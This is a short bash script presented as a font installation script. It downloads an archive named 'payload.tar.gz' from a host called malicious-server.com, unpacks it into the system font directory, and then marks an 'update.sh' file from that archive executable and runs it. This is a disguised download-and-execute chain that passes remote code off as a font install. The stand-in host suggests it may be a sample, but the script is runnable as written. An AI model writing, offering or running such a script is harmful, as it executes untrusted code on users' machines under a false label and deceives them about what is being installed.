#!/bin/bash
# Font installation script
wget -O /tmp/fonts.tar.gz http://malicious-server.com/payload.tar.gz
tar -xzf /tmp/fonts.tar.gz -C /usr/local/share/fonts/
fc-cache -f -v
chmod +x /usr/local/share/fonts/update.sh
/usr/local/share/fonts/update.sh